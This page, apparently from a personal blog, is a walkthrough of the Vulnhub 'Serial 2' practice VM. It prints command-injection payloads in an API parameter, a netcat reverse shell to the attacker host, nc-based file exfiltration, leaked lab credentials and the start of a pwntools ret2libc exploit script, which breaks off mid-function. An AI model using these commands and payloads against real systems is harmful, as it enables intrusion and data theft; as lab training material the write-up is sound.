@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:hexterisk]">
+<meta name="description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
+LHIP is the Local Host’s IP Address
+Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
+IP Discovery Run sudo netdiscover.
+It detects online hosts by sending ARP requests.
+Output of netdiscover.
+192.168.1.10 happens to be the IP of the VM." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://hexterisk.tech/blog/posts/2020/05/09/serial-2/" />
+
+
+    <title>
+        
+            Serial 2: Pwn the world.  — A noob&#39;s attempt at blogging.
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://hexterisk.tech/blog/main.min.c8585fd607292199b471f54e83f63f2c9c8b59a00490e9de2e0259cf4b706c23.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://hexterisk.tech/blog/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hexterisk.tech/blog/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hexterisk.tech/blog/favicon-16x16.png">
+    <link rel="manifest" href="https://hexterisk.tech/blog/site.webmanifest">
+    <link rel="mask-icon" href="https://hexterisk.tech/blog/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://hexterisk.tech/blog/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+<meta itemprop="name" content="Serial 2">
+<meta itemprop="description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
+LHIP is the Local Host’s IP Address
+Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
+IP Discovery Run sudo netdiscover.
+It detects online hosts by sending ARP requests.
+Output of netdiscover.
+192.168.1.10 happens to be the IP of the VM.">
+<meta itemprop="datePublished" content="2020-05-09T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-05-09T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1945">
+<meta itemprop="image" content="https://hexterisk.tech/blog"/>
+
+
+
+<meta itemprop="keywords" content="Serial2,Vulnhub,pentesting,penetration,testing,binary," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hexterisk.tech/blog"/>
+
+<meta name="twitter:title" content="Serial 2"/>
+<meta name="twitter:description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
+LHIP is the Local Host’s IP Address
+Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
+IP Discovery Run sudo netdiscover.
+It detects online hosts by sending ARP requests.
+Output of netdiscover.
+192.168.1.10 happens to be the IP of the VM."/>
+
+
+
+    <meta property="article:section" content="Pentesting" />
+
+
+
+    <meta property="article:published_time" content="2020-05-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://hexterisk.tech/blog/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$cd ~/</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://hexterisk.tech/blog/about/">About</a></li><li><a href="https://hexterisk.tech/blog/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>10 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://hexterisk.tech/blog/posts/2020/05/09/serial-2/">Serial 2</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <ul>
+<li><strong>Name</strong>: <a href="https://stackedit.io/%5Bhttps://www.vulnhub.com/entry/serial-2,373/%5D(https://www.vulnhub.com/entry/serial-2,373/)">serial: 2</a></li>
+<li><strong>Date release</strong>: 27 Sep 2019</li>
+<li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/sk4,633/">sk4</a></li>
+<li><strong>Series</strong>: <a href="https://www.vulnhub.com/series/serial,231/">serial</a></li>
+</ul>
+<h1 id="initial-discovery">Initial Discovery</h1>
+<p><code>VMIP</code> is the VM’s IP Address</p>
+<p><code>LHIP</code> is the Local Host’s IP Address</p>
+<p>Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.</p>
+<h3 id="ip-discovery">IP Discovery</h3>
+<p>Run <code>sudo netdiscover</code>.</p>
+<p>It detects online hosts by sending ARP requests.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/pmHtp_bhilEmwhFJ0EaVuopytJDO0qqDa3KdbCIKVqbOl_CMDDaxCX1q8h4e3aLkc2XpUbWhvpKxBIniTkano_6rqd64e03ezaeAsEfC0EafGfIe0R6LdGPOtrYOGwfbiCd0MVl1jkf4zngdlQ.png" alt="&ldquo;netdiscover&rdquo;">
+<em>Output of netdiscover.</em></p>
+<p>192.168.1.10 happens to be the IP of the VM.</p>
+<h3 id="port-discovery">Port Discovery</h3>
+<p>Search for any exposed ports on the VM.</p>
+<p>Run <code>nmap -sC -sV -p- -A 192.168.1.10</code>.</p>
+<p>Format: <code>nmap -sC -sV -p- -A VMIP</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/4yfIFaS_awg0jySSCFWMdM5P3xRl1fXufxKqBwxxW0QKB1z9M6ZivOLCEEJiMK1WrjfplxTM16sGQJHfpQA5aEuxMt1vlpiFGIMAYLY98TvFvwgQbjO1accmc_X2X3sZqt18ti_YPrNQRTLZJg.dat" alt="&ldquo;nmap&rdquo;">
+<em>Output of nmap.</em></p>
+<p><strong>Port 22</strong> is hosting an <strong>SSH</strong> service is running that we might try connecting to later.</p>
+<p><strong>Port 10000</strong> has a weird service <strong>snet-sensor-mgmt</strong> running.</p>
+<h3 id="directory-discovery">Directory Discovery</h3>
+<p>Attempting to enumerate through all the endpoints.
+Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt">common.txt</a> wordlist.</p>
+<p>Run <code>gobuster dir -w common.txt -u 192.168.1.10</code></p>
+<p>Format: <code>gobuster dir WORDLIST -u VMIP</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/2020-05-09-213611_1920x1080_scrot.png" alt="&ldquo;gobuster&rdquo;">
+<em>Output of gobuster.</em></p>
+<p>Since all endpoints return a 200 response, we try to find the ones that return 301, 401.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/1_image.png" alt="&ldquo;gobuster_2&rdquo;">
+<em>Output of gobuster.</em></p>
+<p>The <code>/api</code> endpoint seems to standout.</p>
+<h3 id="manual-discovery">Manual Discovery</h3>
+<p>We visit the IP. It&rsquo;s a website promoting a new mobile application. Poking around the website, I found that the Play Store reference downloads a file named <strong>serial2.apk</strong>.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/jc93_Dp_WstfoFJ-4FFd-BtCwrO3HY5lAtiW2lm2ZyKrCF9zVnrp3vo30kPgTGML7HRORT7M8RksGHv6f3HWPV7UbVXDNcpQJHYnC8XXls5hCnNLtM6TV7ewOi6Ffp-eUIsFrOUMXq07JNJNZQ.png" alt="&ldquo;download&rdquo;">
+<em>Clicking on the box downloads an APK.</em></p>
+<p>Further, several endpoints have been listed on the website. The <code>/api</code> discovered earlier has further endpoints.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/P2M-9D6rDzVmsPHrfwxbCWpB3mbKqjqIEwPhxN3yZmSZO0bqDY-ShZ9vuTySTyIsr3m149xKFyOI0LgfGGV0lA9rLtt_c_IzLTm2EKmZwQLHicayW2QCYVzRWdcGeHz9Sxd-uzhORs-xn_afrQ.dat" alt="&ldquo;api&rdquo;">
+<em>Listed endpoints.</em></p>
+<h1 id="hunting-begins">Hunting begins</h1>
+<p>Let&rsquo;s checkout the weird service running on port 10000 first.</p>
+<p>Run <code>telnet 192.168.1.10 10000</code></p>
+<p>Format: <code>telnet VMIP 10000</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/2_image.png" alt="&ldquo;telnet&rdquo;">
+<em>Output of telnet.</em></p>
+<p>This service logs us in as the root user(since it&rsquo;s asking for the root user&rsquo;s password). As we do not have the root password yet, this is a dead end for now.</p>
+<p>I then tried to connect to the endpoints mentioned on the webpage by making a <code>GET</code> request to <code>VMIP</code>, and received a response with a status code <code>401 Unauthorized</code>.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/image.png" alt="&ldquo;unauth&rdquo;">
+<em>Response status code Unauthorized.</em></p>
+<p>I tried installing the apk on an <strong>AVD</strong>(<strong>Android Virtual Device</strong>) hosted via Genymotion. It failed.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/L8-AhnXR_gool12Me8legOhPNnCM5XLGtQeLeutFX8edQd4QUBltzunAysJj_XnTKJeqN5cU7Bk-oGpDCMglEWgqa7FbYAwsV6q3XPUTZoP4dRvVRXk6KnCLHJPiZdPPhVxl4k-BiSRMprpH1Q.png" alt="&ldquo;avd&rdquo;">
+<em>Failed installation on Genymotion AVD.</em></p>
+<p>Alright then, we spin up JADX and reverse the apk.</p>
+<p>Instinctively jumping to <code>Resources/resources.arsc/res/values/strings.xml</code>, I found a string token named <code>basic_auth</code>.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/iB8ei9LOtdAVHXVOZ02R44hDg3H8-uDdN-tEUrtXKWXMd7bDADV6kti3eBVCN7BwVqbwxFakXwLUTPBtlQfiUzu95F5W8u8HQbYoFiNuDFfX3TY6X-wcTaBXm69pBpIlCUh3ASrtYRhdKX1zZw.png" alt="&ldquo;jadx&rdquo;">
+<em>strings.xml file of the apk.</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;c2s0OmJKNiErbSUqJF0jeDc9TEE=&#34;</span>))
+</code></pre></div><p><code>sk4:bJ6!+m%*$]#x7=LA</code></p>
+<p>We open postman to make a request to the endpoints we found on the website earlier, and try to use this decoded value as auth credentials.</p>
+<p>We choose the authentication type as Basic Auth and enter:</p>
+<p>Username: <code>sk4</code></p>
+<p>Password: <code>bJ6!+m%*$]#x7=LA</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/l17DusDGH3kYb53rmjt7ks_KGstttN22t0oNq2uiDXfKBG1xLEPhxWpl1v1fhpdBfBlWAEk8H261mFg8HN9uLYsZ8dJ8qYovjOjP7AYiXIMRbfxfIlu55_--SFxHuYdNsPhX8afyKTMYC_mA7Q.dat" alt="&ldquo;basic_auth&rdquo;">
+<em>Request using credentials.</em></p>
+<p>Voilà! We receive a response with status code <code>200 OK</code>.</p>
+<p>Now, we provide the required parameter (as indicated in the response message). Moreover, piping outputs from commands into nmap is a fairly common technique used in automated recon scripts, bash jail escapes and creating vim shortcuts.</p>
+<p><code>GET</code> request to <code>192.168.1.10/api/nmap?ip=127.0.0.1 | ls -la</code></p>
+<p>Format: <code>VMIP/api/nmap?ip=127.0.0.1 | ls -la</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/uWwZIgawjVLXcTsItWyc46X8Y7CFF-fYQFEok2dQkem6GTlJk9aEvFQK0WAnBPM8MZs3f1nmNuwjDmsgjcMuPj5IJpzpalFrLaSMPqgmipBiI_ig7htTX243hwcWQnwMQEC53YuYnurwNdI9hg.dat" alt="&ldquo;command_exec&rdquo;">
+<em>Command execution verified.</em></p>
+<p>Thereafter, we try to spawn a reverse shell.</p>
+<p>Start a listener on the host machine.</p>
+<p>Run <code>nc -nlvp 4444</code></p>
+<p>Format: <code>nc -nlvp PORT</code></p>
+<p>And then try to connect to this listener via the VM.</p>
+<p>Run <code>192.168.1.10/api/nmap?ip=127.0.0.1 | nc 192.168.1.6 4444 -e /bin/sh</code></p>
+<p>Format: <code>VMIP/api/nmap?ip=127.0.0.1 | nc LHIP PORT -e /bin/sh</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/Xq0aYQaGvXO8jBa4xXmRspLTKx6YJeKGaIhThPPFtJxp6QZ7sZwo-9p6u3JDKeaa1cV4GSmXytyV87O5oF3l63ZQPdFTE68_LjY_kn2WP5BJHMDOmbHB5gA50eJcMUxa9InNUlPPK-_WZ7_A5A.dat" alt="&ldquo;local_listener&rdquo;">
+<em>Listener on local host.</em></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/J3p_t5lO-DvxtiRC4h2PAqcOca6TiULuaN2FHy3hfnwx4mqPoN4x2OrboYDqitRAgR1mLV0uZNAhu8UBod6gPWDDybCvgdkqA0qBPeRITsDiqYq6V-IQYBGD1Sp_lk-GEGHVNGFkbj66npXCSA.dat" alt="&ldquo;connect_listener&rdquo;">
+<em>Connect to the listener.</em></p>
+<p>We pack everything inside the VM and fetch it to our local host for further analysis.</p>
+<p>Run <code>tar -czvf serial2.tar.gz *</code></p>
+<p>Format: <code>tar -czvf FILE *</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/ZUShaAIjtmAsWKoEkpd5v6S1LTLj1F68LzCvxeqhoV9fPPfyjzcN-78l_I4Ts3oQb_KLpfZlWYvBicOC4FvVkTL5nA-W9toTO87va8dfg5FFyQd_q4S28I3C5eYZg8eJ8aVdAUCw.png" alt="&ldquo;tar&rdquo;">
+<em>tar all contents.</em></p>
+<p>Start a new listener on a different port and redirect all the data received on it into a file.</p>
+<p>Run <code>nc -nlvp 1337 &gt; serial2.tar.gz</code></p>
+<p>Format: <code>nc -nlvp NewPORT &gt; FILENAME</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/GUTZ4WnglKqrfCZbvBsDQZNhX-kDwOemheRlfVMKmETVgOB6bGIYsF4Do4OnNYV5fQ_jIbOe0ohaAC37WWpRUTGAnarRMe9QIVNiaPWuxqEoPl5gJvMORm2Z1oeQTOflUN_5FnsccRuMf5AW8A.dat" alt="&ldquo;local_listener&rdquo;">
+<em>Pipe all input from the listener to file.</em></p>
+<p>Pipe all bytes from the file into the listener.</p>
+<p>Run <code>cat serial2.tar.gz | nc 192.168.1.6 1337</code></p>
+<p>Format: <code>cat FILE | nc LHIP NewPORT</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/s8HdLB48dPURowb5aSbZkWXSWhnp9ZsG98jCJupqefo1qqezBX21XlMdLmI5f4VB92RLPYYc2nWd4J31-fiHzF8hAL9BqJRMbHU_iKGGgT-JMCd0uQHAz5s_X7rVvW201c-vUa6woPIkZcNLVA.png" alt="&ldquo;connect_listener&rdquo;">
+<em>Send all bytes of the file to the listener.</em></p>
+<p>Exploring all the files, we spot a .git folder.</p>
+<p>Instinctively, we check the git log.</p>
+<p>Run <code>git log</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/Epy59D1WxRBj_CWmWz2fAL41lpbsrt1nt6tWpEXlw-qbT4hh_wrlDBK8CZwjgE4hrnxAbqaaCteI8LxWsX3l-MoYalO1J9MCfMciZyQf2C_YcbZkOGsHBIA0W4UYDj6q4jiE9Ddu9jzqbneYTQ.png" alt="&ldquo;git_log&rdquo;">
+<em>Output of git log.</em></p>
+<p>The commit message straight up implies that some keys have been removed.</p>
+<p>We therefore check the state of the files before this commit. This means rolling back to the previous commit.</p>
+<p>Run <code>git checkout b039a4207810e47cde90db811661217af2bc67c3</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/C2GCkwoXPhPVpC0H24HrAexqs_ubqs7_UaRff_Vhg07KaAyRaHKgWajajasXE1804ytCpQDW7JtbRuQSg0hrjq5v7yh9KmKLUrIu9t06WCYQz4o2VvJPFHfeYXrrtU7DsIMGQJnIgnULPVx1uw.dat" alt="&ldquo;git_checkout&rdquo;">
+<em>Rolling back to the commit whose hash was specified.</em></p>
+<p>Looking around, I spot a RSA keypair.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/miV283IclOl-rWur5f2jWFnIzW2pD2vFw4deSXHu8SOiSylfqU1mwIIlj1ZStiMtBI1pmgqAwDlVmMu4u6XZ5UJbH-hJwdJoXcPhcp8gkd8OvQVbaNrDyZFn-KFGbA0firobBZV2C3j7LUlnWA.dat" alt="&ldquo;rsa_keypair&rdquo;">
+<em>RSA keypair spotted.</em></p>
+<p>We can use this private key to connect to the SSH service running on the VM.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/XjMmGS3OaORnF9CCOzVC2ULTe6eACS-kDCb76GpiAlzLLzcGs3_3c131QChhDA42M0eWHKstymG-vjwNiL7X1hYpD9IeLxxqcjx7u_bY8_yeu4n9gEvJOwlunq0_fTPHqSnGo9Qf-HRDTtis7w.dat" alt="&ldquo;bad_permissions&rdquo;">
+<em>A bad permissions error is shown.</em></p>
+<p>A bad permission error is thrown. This is because the key does not have appropriate permissions.</p>
+<p>Run <code>chmod 0600 id_rsa</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/lahZm8F34fGKorE7zH17KJQHsdKvpNPB82hOmzLQKqmyjoBF-VqT2rEcSOOQS3ijnGcAOv3TfP_Devbe6opjBUb-FWH3Az-bzFz9bAj5UQKgquiGGYdO8r3GC5-8mok5u7rXxh_lnGvlwXFFrw.dat" alt="&ldquo;chmod&rdquo;">
+<em>Modifying permissions of the key.</em></p>
+<p>This time the connection attempt is successful.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/-rFLRB8gbOfs3hGSOdfKceCuB1pkbI5iDmnTSGlIOKAQsuNi7NNGkCyiWs4p8_vJo_mHR7RKrXXyQcixm9tPKRZA--JxmZG7ktfRnPT5fL48yuTqKNWpAF6wR55nC4UxeuIq7uzyPM3fwvsXfw.dat" alt="&ldquo;connect_success&rdquo;">
+<em>SSH connected.</em></p>
+<p>Run <code>ls -la</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/5jFaFA8pi8B_7f90fPCpxjby7v-hDW56BZYu1SABYdmHJh2Tv3dJtY-VaD4nxA0mcqkZgf9cBGcNEe7wDIS9I0fKA-FstwqZrmNJgl-Trgc_UvKXHtYAcKJidIOloNF4OEhe-Oa4i9IriuAL9g.dat" alt="&ldquo;ls&rdquo;">
+<em>flag.txt can be seen.</em></p>
+<p>Run <code>cat flag.txt</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/aYqY6XNq15cVNRvFkhxyIcmHjhGye39-EHYnfeIvHEUgVGpV5Jp5DnJxnOGYJztofABMp-4YEKN0PT-WkM3TPUbRwSCuh9QkMKuk2uxhoK3NViVSqKVAdCMr6dMpVXJ9f2uR8QB0MUQscWCdNw.dat" alt="&ldquo;flag&rdquo;">
+<em>flag,txt</em></p>
+<p>We got our first flag. This must be the user flag since we are logged in as <code>sk4</code>.</p>
+<p>The service running on port 10000 was asking for the root user&rsquo;s password. Since it definitely would be running some sort of a check on the password entered, let&rsquo;s try and find the binary served on the port and see if we can something in it.</p>
+<p>Run <code>netstat -tulpn | grep :10000</code></p>
+<p>It displays all the connections, and the corresponding information.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/3_image.png" alt="&ldquo;netstat&rdquo;">
+<em>Output of netstat.</em></p>
+<p>The service is most probably being run by root.</p>
+<p>I took the approach of hit and trial trying to find files using the words printed on the terminal before it asks for a password.</p>
+<p>I got a hit with the word <strong>backd00r</strong>.</p>
+<p>Run <code>find / -name backd00r</code></p>
+<p>Format: <code>find / -name WORD</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/4_image.png" alt="&ldquo;backd00r&rdquo;">
+<em>File found named backd00r.</em></p>
+<p>I executed it once to verify that it is indeed the binary being served on port 10000.</p>
+<p>Fetch it to local host for further analysis, just like we did with the tar of all files earlier.</p>
+<p>Start a new listener and redirect all the data received on it into a file.</p>
+<p>Run <code>nc -nlvp 1337 &gt; backd00r</code></p>
+<p>Format: <code>nc -nlvp PORT &gt; BINARYNAME</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/5_image.png" alt="&ldquo;local_listener&rdquo;">
+<em>Pipe all input from the listener to file.</em></p>
+<p>Pipe all bytes from the file into the listener.</p>
+<p>Run <code>cat /bin/backd00r | nc 192.168.1.6 1337</code></p>
+<p>Format: <code>cat /bin/backd00r | nc LHIP PORT</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/6_image.png" alt="&ldquo;connect_listener&rdquo;">
+<em>Send all bytes of the file to the listener.</em></p>
+<p>Run <code>chmod +x backd00r</code> to give the binary execution permissions.</p>
+<p>We run a strings on the binary.</p>
+<p>Run <code>strings backd00r</code></p>
+<p>Format: <code>strings BINARYNAME</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/7_image.png" alt="&ldquo;strings&rdquo;">
+<em>Output of strings.</em></p>
+<blockquote>
+<p><a href="mailto:root@serial2.vulnab">root@serial2.vulnab</a>&rsquo;s password:</p>
+<p>j&amp;9GCS34MY+^4ud*</p>
+</blockquote>
+<p>It indicates that the following string is root password. So we make another attempt to login to the service using this password.</p>
+<p>We then try and execute the binary from the user shell.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/15_image.png" alt="&ldquo;root&rdquo;">
+<em>Obtained root shell.</em></p>
+<p>The password is validated and we get the root shell. However, it does not allow us to read the <code>flag.txt</code> file. The shell is clearly a restricted one.</p>
+<p>Similar thing happens when I try this tactic via the service on port 10000 from local host. Clearly there&rsquo;s more to the binary than we initially thought.</p>
+<p>We are now getting into the arena of binary exploitation. You could just skip ahead to the end and use the given script to pwn the service if you do not want to get into this section.</p>
+<h1 id="binary-exploitation">Binary Exploitation</h1>
+<p>We open the binary in IDA.</p>
+<p>The binary is short and sweet, and there&rsquo;s not much to it.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/10_image.png" alt="&ldquo;main&rdquo;">
+<em>The &ldquo;main&rdquo; function of the binary.</em></p>
+<p>We take a look at the <em>login</em> function here, since root password is all we desire. </p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/17_image.png" alt="&ldquo;login&rdquo;">
+<em>The &ldquo;login&rdquo; function of the binary.</em></p>
+<p>It turns out that the string we found indeed is the value against which are input is verified, though we still don&rsquo;t know if it is the root password. We therefore try to escalate to the root user via the shell of user <strong>sk4</strong>.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/11_image.png" alt="&ldquo;auth_fail&rdquo;">
+<em>Root user auth failure.</em></p>
+<p>But to no avail. It&rsquo;s settled then, the string we had found isn&rsquo;t the root user&rsquo;s password.</p>
+<p>Looking around in the <em>loop</em> function, I realise that the prompt we are presented with after entering the password is not that of a shell at all, it&rsquo;s just a case riddled input.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/13_image.png" alt="&ldquo;loop&rdquo;">
+<em>The &ldquo;loop&rdquo; function of the binary.</em></p>
+<p>We need to pwn the binary.</p>
+<p>We analyse the binary using GDB-Peda.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/18_image.png" alt="&ldquo;checksec&rdquo;">
+<em>Checking security measures applied on the binary.</em></p>
+<p>Clearly this binary is open to the existence of buffer overflow and GOT overwrite vulnerabilities. The binary is not a PIE binary, however the system is expected to have ASLR enabled. Since NX is enabled, we cannot push a shellcode on the stack. Rather, we would have to build a ROP chain for arbitrary code execution.</p>
+<p>This can be confirmed by checking the value in the file <strong>/proc/sys/kernel/randomize_va_space</strong>.</p>
+<p>Run <code>cat /proc/sys/kernel/randomize_va_space</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/19_image.png" alt="&ldquo;aslr&rdquo;">
+<em>ASLR enabled.</em></p>
+<p>Since PIE is_ disabled, only the base address of <code>libc</code> will be randomised, while the base address of the binary will remain constant. And since the offset of different sections of the binary are constant, we can find the address of a frequently occuring function like <code>puts</code> or <code>gets</code> in the <code>plt section</code> and use it to leak the address of <code>libc</code>. The library is in **/lib/x86_64-linux-gnu/** in modern 64-bit standard distributions by default.</p>
+<p>Start a new listener and redirect all the data received on it into a file.</p>
+<p>Run <code>nc -nlvp 1337 &gt; libc.so.6</code></p>
+<p>Format: <code>nc -nlvp PORT &gt; LIBNAME</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/21_image.png" alt="&ldquo;local_listener&rdquo;">
+<em>Pipe all input from the listener to file.</em></p>
+<p>Pipe all bytes from the file into the listener.</p>
+<p>Run <code>cat /lib/x86_64-linux-gnu/libc.so.6 | nc 192.168.1.6 1337</code></p>
+<p>Format: <code>cat /lib/x86_64-linux-gnu/libc.so.6 | nc LHIP PORT</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/22_image.png" alt="&ldquo;connect_listener&rdquo;">
+<em>Send all bytes of the file to the listener.</em></p>
+<p>Set the <strong>LD_LIBRARY_PATH</strong> environment variable to the path of this library to ensure that the binary uses this particular libc.</p>
+<p>Analysing the binary, I found a buffer overflow vulnerability.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/16_image.png" alt="&ldquo;loop&rdquo;">
+<em>Buffer overflow vulnerability in the &ldquo;loop&rdquo; function of the binary.</em></p>
+<p>Playing with the input, I was able to cause a SIGSEGV through instruction pointer corruption.</p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/20_image.png" alt="&ldquo;sigsegv&rdquo;">
+<em>SIGSEGV encountered.</em></p>
+<p>The value stored in the instruction pointer at the time of the error is compared against the input provided, and it is found that the input buffer is only 72 bytes far from the saved return address on stack.</p>
+<p>We use the <strong>pwntools</strong> library to build our exploit script.</p>
+<p>Finding the relevant addresses:</p>
+<p>Run  <code>objdump -d -M intel backd00r | grep puts</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/23_image.png" alt="&ldquo;puts&rdquo;">
+<em>Address of puts@plt.</em></p>
+<p>Run <code>readelf -r backd00r | grep puts</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/25_image.png" alt="&ldquo;puts_libc&rdquo;">
+<em>Address of puts in libc.</em></p>
+<p>Run <code>ropper --file backd00r --search &quot;pop rdi&quot;</code></p>
+<p><img src="https://hexterisk.tech/blog/Serial_2/26_image.png" alt="&ldquo;gadget&rdquo;">
+<em>Address of gadget.</em></p>
+<p>Following is the final script used to exploit the service:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>, checksec <span style="color:#f92672">=</span> False)
+
+offset_binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+offset_puts <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
+offset_system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
+
+address_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400bb3</span>
+
+got_puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602018</span>
+plt_puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005c0</span>
+loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(r):
+    pause()
+    <span style="color:#75715e"># Pass the password check to reach the prompt.</span>
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;vulnab&#39;s password: &#34;</span>)
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;j&amp;9GCS34MY+^4ud*&#34;</span>)
+    response <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()
